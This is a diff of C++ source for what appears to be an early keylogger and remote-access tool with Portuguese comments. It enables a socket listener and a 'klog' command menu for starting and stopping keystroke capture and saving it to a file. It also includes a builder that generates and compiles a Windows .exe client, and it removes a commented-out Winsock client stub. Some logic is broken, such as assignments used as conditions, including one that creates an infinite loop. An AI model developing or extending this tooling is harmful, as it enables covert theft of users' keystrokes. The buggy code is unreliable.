@@ -21,6 +21,7 @@ int port = 0;
 int i = 0;
 bool parameters_found = false;
 bool hifen_encontrado = false;
+bool estado_de_conexao = false;
 
 //Variaveis utilizadas no modulo de conexão:
 int server_fd, new_socket, valread;
@@ -205,8 +206,6 @@ int open_listener()
         return -1;
     }
 
-/*
-
     // Aguardando conexões
         std::cout << "Aguardando pelo client\n";
     if (listen(server_fd, 3) < 0) {
@@ -221,7 +220,11 @@ int open_listener()
     }
 
         std::cout << "Cliente conectado com sucesso\n";
+	estado_de_conexao = true;
 
+
+	while(estado_de_conexao = true){
+	}
     // Recebendo dados do cliente
     valread = read(new_socket, buffer, 1024);
     std::cout << buffer << std::endl;
@@ -233,7 +236,6 @@ int open_listener()
     // Fechando o socket
     close(new_socket);
     close(server_fd);
-*/
 
 	//Caso o listener seja iniciado, o programa não fecha e segue:
 	memset(command, 0, command_size);
@@ -265,11 +267,17 @@ int open_listener()
 			++i;
 
 			if(command[i] == 'h'){
-				std::cout << "\nklog <start/stop>> <Parâmetros do start>\n";
-				std::cout << "--sart        Inicia o Keylogger\n";
-				std::cout << "--stop 	      Para o Keylogger\n";
+				std::cout << "\nklog <start/stop> <Parâmetros do start>\n";
+				std::cout << "--begin        Inicia o Keylogger\n";
+				std::cout << "--end 	      Para o Keylogger\n";
 				std::cout << "-t            Mostra a input do usuário diretamente na tela do terminal\n";
 				std::cout << "-o \"nome.txt\" Grava a input capturada em um arquivo\n\n";
+			}
+
+			++i;
+			if(command[i] = 'b')
+			{
+				
 			}
 
 		}else if(command[0] == 's'){
@@ -290,7 +298,6 @@ int builder()
 {
         std::ofstream arquivocpp("build.cpp");
 
-
         arquivocpp << build_content_1;
         arquivocpp << port;
         arquivocpp << build_content_2;
@@ -305,64 +312,5 @@ int builder()
         system("chmod +x ./call_compiller.sh && ./call_compiller.sh");
 
         std::cout << ".exe gerado com sucesso\n";
-
-/*
-#include <iostream>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <cstring>\nint main() {\nWSADATA wsaData;\nSOCKET clientSocket = INVALID_SOCKET;\nstruct sockaddr_in serverAddress;
-    \nconst char* hello = \"Hello from client\";
-    \nchar buffer[1024] = {0};
-
-    \n// Inicializando o Winsock
-    \nif (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        \nstd::cerr << \"Falha na inicialização do Winsock\" << std::endl;
-        \nreturn -1;
-    \n}
-
-    \n// Criando o socket
-    \nif ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-        \nstd::cerr << \"Falha na criação do socket\" << std::endl;
-        \nWSACleanup();
-        \nreturn -1;
-    \n}
-
-    \n// Configurando o endereço do servidor
-    \nserverAddress.sin_family = AF_INET;
-    \nserverAddress.sin_port = htons(port);
-    \nserverAddress.sin_addr.s_addr = inet_addr(ip);
-
-    \n// Conectando ao servidor
-    \nif (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
-        \nstd::cerr << \"Erro na conexão com o servidor\" << std::endl;
-        \nclosesocket(clientSocket);
-        \nWSACleanup();
-        \nreturn -1;
-    \n}
-
-    \n// Enviando dados ao servidor
-    \nif (send(clientSocket, hello, strlen(hello), 0) < 0) {
-        \nstd::cerr << \"Erro no envio de dados ao servidor\" << std::endl;
-        \nclosesocket(clientSocket);
-        \nWSACleanup();
-        \nreturn -1;
-    \n}
-
-    \n// Recebendo resposta do servidor
-    \nif (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {
-        \nstd::cerr << \"Erro na recepção da resposta do servidor\" << std::endl;
-        \nclosesocket(clientSocket);
-        \nWSACleanup();
-        \nreturn -1;
-    \n}
-    \nstd::cout << \"Resposta do servidor: \" << buffer << std::endl;
-
-    \n// Fechando o socket
-    \nclosesocket(clientSocket);
-
-    \n// Finalizando o Winsock
-    \nWSACleanup();
-
-    return 0;
-}
-
-*/
 return 0;
 }
